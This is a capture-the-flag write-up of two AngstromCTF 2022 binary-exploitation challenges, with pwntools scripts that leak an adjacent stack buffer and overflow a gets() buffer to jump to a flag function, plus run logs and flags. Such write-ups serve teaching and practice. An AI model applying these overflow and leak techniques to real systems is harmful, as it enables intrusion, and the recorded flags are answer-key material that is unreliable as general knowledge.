# AngstromCTF - Pwn

## whatsmyname (50 pts)

> Can you guess my name?
>
> `nc challs.actf.co 31223`
>
> [whatsmyname](pwn/whatsmyname/whatsmyname) [whatsmyname.c](pwn/whatsmyname/whatsmyname.c)

The program takes in 47 randomly generated bytes as its name(`myName[48]`), and asks me to enter my name(`yourName[48]`) and guess its name(`guess[48]`). It accepts the first input by `read()` function.

```cpp

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

static void generate_name(char *str)
{
    FILE *file = fopen("/dev/urandom","r"
    fgets(str, 48, file);
    close(file);
}

int main(){
    char yourName[48];
    char myName[48];
    
    char guess[48];

    setbuf(stdout, NULL);

    generate_name(myName);

    printf("Hi! What's your name? ");

    int n = read(0, yourName, 48);
    if (yourName[n-1] == '\n') yourName[n-1] = '\x00';

    printf("Nice to meet you, %s!\n", yourName);

    puts("Guess my name and you'll get a flag!");

    scanf("%48s[^\n]", guess);

    if (strncmp(myName, guess, 48) == 0){
        // Print FLAG
    }

    puts("Bye!");
    return 0;
}
```

But when I enter a 48-letter answer, it prints something else along with my input.

```text
8M:/mnt/d/GitHub/angstromCTF2022/pwn/whatsmyname$ ./whatsmyname
Hi! What's your name? aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
{w^w
     l-JĖϿ|KImԩ(f!aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Guess my name and you'll get a flag!
```

Debugging the program reveals that `myName` is located right after `yourName`, and completely filling `yourName` removes the null character (`\x00`) that separates the two, revealing the random bytes it set as its name. 

Therefore, we can get the flag by giving the revealed string back to the program when answering the second question.

```python
from time import sleep
from pwn import *
context.log_level = "debug"

buf = b"abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKL"

app = remote("challs.actf.co", 31223)
app.recvuntil(b'name?')
app.sendline(buf + b"\n")
res = app.recvuntil(b"Guess my name and you'll get a flag!\n")
sleep(0.4)
payload = res[67:len(res)-39] 
app.sendline(payload)
print(app.recvall())
```

[This script](pwn/whatsmyname/solution.py) sends the leaked answer, including non-printable bytes, back to the program. As long as `myName` itself does not include null bytes, the script yields the flag.

```text
8M:/mnt/d/GitHub/angstromCTF2022/pwn/whatsmyname$ python3 solution.py
[+] Opening connection to challs.actf.co on port 31223: Done
[DEBUG] Received 0x16 bytes:
    b"Hi! What's your name? "
[DEBUG] Sent 0x32 bytes:
    b'abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKL\n'
    b'\n'
[DEBUG] Received 0x98 bytes:
    00000000  4e 69 63 65  20 74 6f 20  6d 65 65 74  20 79 6f 75  │Nice│ to │meet│ you│
    00000010  2c 20 61 62  63 64 65 66  67 68 69 6a  6b 6c 6d 6e  │, ab│cdef│ghij│klmn│
    00000020  6f 70 71 72  73 74 75 76  77 78 79 7a  31 32 33 34  │opqr│stuv│wxyz│1234│
    00000030  35 36 37 38  39 30 41 42  43 44 45 46  47 48 49 4a  │5678│90AB│CDEF│GHIJ│
    00000040  4b 4c aa 1a  02 72 58 44  a6 90 d6 47  d3 49 ae 71  │KL··│·rXD│···G│·I·q│
    00000050  ae d7 a5 53  ae 23 fa 24  c7 6f fc 8c  7b 3d f1 89  │···S│·#·$│·o··│{=··│
    00000060  d7 1e 27 69  38 52 f8 9a  54 f0 79 03  51 87 56 96  │··'i│8R··│T·y·│Q·V·│
    00000070  b2 21 0a 47  75 65 73 73  20 6d 79 20  6e 61 6d 65  │·!·G│uess│ my │name│
    00000080  20 61 6e 64  20 79 6f 75  27 6c 6c 20  67 65 74 20  │ and│ you│'ll │get │
    00000090  61 20 66 6c  61 67 21 0a                            │a fl│ag!·│
    00000098
[DEBUG] Sent 0x30 bytes:
    00000000  aa 1a 02 72  58 44 a6 90  d6 47 d3 49  ae 71 ae d7  │···r│XD··│·G·I│·q··│
    00000010  a5 53 ae 23  fa 24 c7 6f  fc 8c 7b 3d  f1 89 d7 1e  │·S·#│·$·o│··{=│····│
    00000020  27 69 38 52  f8 9a 54 f0  79 03 51 87  56 96 b2 0a  │'i8R│··T·│y·Q·│V···│
    00000030
[+] Receiving all data: Done (52B)
[DEBUG] Received 0x34 bytes:
    b'actf{i_c0uld_be_l0nely_with_y0u_a21f8611c74b}\n'
    b'\n'
    b'Bye!\n'
[*] Closed connection to challs.actf.co port 31223
b'actf{i_c0uld_be_l0nely_with_y0u_a21f8611c74b}\n\nBye!\n'
```

**Flag: `actf{i_c0uld_be_l0nely_with_y0u_a21f8611c74b}`**

## wah (100 pts)

> Baby friendly!
>
> [wah](pwn/wah/wah) [wah.c](pwn/wah/wah.c)
>
> `nc challs.actf.co 31224`

The program accepts user input for 24-byte string. It also has a function that prints flag.

```cpp
void flag(){
    char flag[128];
    
    FILE *file = fopen("flag.txt","r");
    if (!file) {
        puts("Error: missing flag.txt.");
        exit(1);
    }

    fgets(flag, 128, file);
    puts(flag);
}


int main(){
    setbuf(stdout, NULL);
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    
    char cry[24];

    printf("Cry: ");

    gets(cry);
    return 0;
}
```

The goal here is to overflow the buffer to access the `flag()` function.

```text
8M:/mnt/d/GitHub/angstromCTF2022/pwn/wah$ objdump -D wah | grep flag
0000000000401236 <flag>:
  401261:       75 16                   jne    401279 <flag+0x43>
```

Now that we have the address of `flag()`, we need to know how long the payload should be.

```text
8M:/mnt/d/GitHub/angstromCTF2022/pwn/wah$ ./wah
Cry: aaaaaaaaaabbbbbbbbbbccccccccccdddddddddd
Cry: aaaaaaaaaabbbbbbbbbbccccccccccdddddddddd
Cry: aaaaaaaaaabbbbbbbbbbccccccccccddddddddddd
Segmentation fault
```

We now know that the return address should be preceded by 40 bytes of filler. Below is [the script](pwn/wah/solution.py) that injects the payload to the program.

```python
from pwn import *

wah = remote("challs.actf.co", 31224)

payload = b"A" * 40 + p64(0x401236)

wah.recvn(4)
wah.sendline(payload)
print(wah.recvall())
```

The script successfully obtains the flag.

```text
8M:/mnt/d/GitHub/angstromCTF2022/pwn/wah$ python3 solution.py 
[+] Opening connection to challs.actf.co on port 31224: Done
[+] Receiving all data: Done (61B)
[*] Closed connection to challs.actf.co port 31224
b' actf{lo0k_both_w4ys_before_y0u_cros5_my_m1nd_c9a2c82aba6e}\n\n'
```

**Flag: `actf{lo0k_both_w4ys_before_y0u_cros5_my_m1nd_c9a2c82aba6e}`**
